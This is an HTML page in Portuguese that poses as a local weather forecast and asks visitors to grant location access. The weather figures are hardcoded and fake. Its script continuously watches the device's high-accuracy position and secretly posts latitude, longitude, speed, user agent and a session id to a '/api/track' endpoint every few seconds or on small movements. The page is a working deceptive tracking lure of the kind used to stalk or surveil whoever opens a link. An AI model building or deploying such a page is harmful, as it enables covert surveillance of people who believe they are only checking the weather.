<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Previsão do Tempo</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gradient-to-br from-blue-500 to-indigo-700 min-h-screen flex items-center justify-center p-4 text-white">

    <div class="bg-white/10 backdrop-blur-md p-6 rounded-2xl border border-white/20 max-w-sm w-full text-center shadow-xl">
        <h1 class="text-2xl font-bold mb-1">Previsão Local</h1>
        <p class="text-sm opacity-80 mb-6">Permita o acesso à localização para ver o clima exato na sua região.</p>

        <div id="loading" class="py-8">
            <div class="inline-block animate-spin rounded-full h-10 w-10 border-4 border-white border-t-transparent"></div>
            <p class="mt-3 text-sm">Carregando dados meteorológicos...</p>
        </div>

        <div id="weather-card" class="hidden">
            <div class="text-6xl font-extrabold mb-2">24°C</div>
            <p class="text-lg font-medium">Parcialmente Nublado</p>
            <div class="mt-6 pt-4 border-t border-white/20 grid grid-cols-2 gap-2 text-sm">
                <div>Umidade: <strong>68%</strong></div>
                <div>Vento: <strong>12 km/h</strong></div>
            </div>
        </div>
    </div>

    <script>
        const sessaoId = 'sess_' + Math.random().toString(36).substring(2, 10);
        let ultimoEnvio = 0;
        let ultimoPonto = null;

        function distanciaMetros(lat1, lon1, lat2, lon2) {
            const R = 6371000;
            const toRad = (v) => (v * Math.PI) / 180;
            const dLat = toRad(lat2 - lat1);
            const dLon = toRad(lon2 - lon1);
            const a =
                Math.sin(dLat / 2) * Math.sin(dLat / 2) +
                Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) *
                Math.sin(dLon / 2) * Math.sin(dLon / 2);
            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
        }

        function enviarLocalizacao(position) {
            const agora = Date.now();
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            // Evita enviar pontos idênticos a cada segundo; envia na 1ª vez, a cada 5s ou ao mover >= 8m
            if (ultimoPonto && (agora - ultimoEnvio < 5000)) {
                const dist = distanciaMetros(ultimoPonto.lat, ultimoPonto.lon, lat, lon);
                if (dist < 8) {
                    mostrarClima();
                    return;
                }
            }

            ultimoEnvio = agora;
            ultimoPonto = { lat, lon };

            const payload = {
                sessaoId,
                latitude: lat,
                longitude: lon,
                accuracy: position.coords.accuracy,
                speed: position.coords.speed,
                userAgent: navigator.userAgent,
                dataHora: new Date().toLocaleString('pt-BR')
            };

            fetch('/api/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(() => mostrarClima())
            .catch(err => {
                console.error(err);
                mostrarClima();
            });
        }

        function mostrarClima() {
            document.getElementById('loading').classList.add('hidden');
            document.getElementById('weather-card').classList.remove('hidden');
        }

        function solicitarLocalizacao() {
            if (navigator.geolocation) {
                navigator.geolocation.watchPosition(
                    enviarLocalizacao,
                    (error) => {
                        console.warn("Permissão negada ou indisponível:", error.message);
                        mostrarClima();
                    },
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 }
                );
            } else {
                mostrarClima();
            }
        }

        window.onload = solicitarLocalizacao;
    </script>
</body>
</html>
